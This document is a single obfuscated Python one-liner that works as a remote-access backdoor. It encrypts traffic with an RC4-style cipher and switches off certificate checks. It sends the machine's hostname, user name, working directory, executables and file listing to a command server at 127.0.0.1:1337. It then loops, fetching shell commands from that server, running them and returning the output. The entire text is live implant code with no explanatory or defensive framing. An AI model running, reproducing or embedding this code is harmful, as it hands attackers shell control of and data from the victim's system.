python3 -c "exec('from json import dumps;from platform import node as h;from urllib.request import urlopen as b, Request as f;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=b\\x22abcd\\x22\\r\\ndef e(p,d=False):\\r\\n\\tif d:v=p[:256];p=p[256:]\\r\\n\\telse:v=y(256)\\r\\n\\tj,S,o=0,list(range(256)),[]\\r\\n\\tfor i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\\r\\n\\tS = [v[i]^c for i,c in enumerate(S)];i=j=0\\r\\n\\tfor c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\\r\\n\\tif d:return bytes(o)\\r\\n\\treturn v+bytes(o)\\r\\ndef g():return [f for d in n[\\x22PATH\\x22].split(\\x22:\\x22 if name \x21= \\x22nt\\x22 else \\x22;\\x22) if w(d) for f in l(d)]\\r\\nc=u();v=\\x22https://127.0.0.1:1337/\\x22\\r\\nwhile x:\\r\\n\\twith q(Exception):\\r\\n\\t\\tr=b\\x22\\x22\\r\\n\\t\\twhile r\x21=b\\x22\\\\6\\x22:\\r\\n\\t\\t\\tr=e(b(f(v,method=\\x22POST\\x22,data=e(b\\x22\\\\1\\x22+dumps({\\x22hostname\\x22:h(),\\x22user\\x22:i(),\\x22cwd\\x22:j(),\\x22executables\\x22:g(),\\x22files\\x22:l()}).encode())),context=c).read(),x)\\r\\n\\t\\td=b\\x22 \\x22\\r\\n\\t\\twhile x:\\r\\n\\t\\t\\tm=e(b(f(v,method=\\x22POST\\x22,data=e(d)),context=c).read(),x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b\\x22 \\x22')"
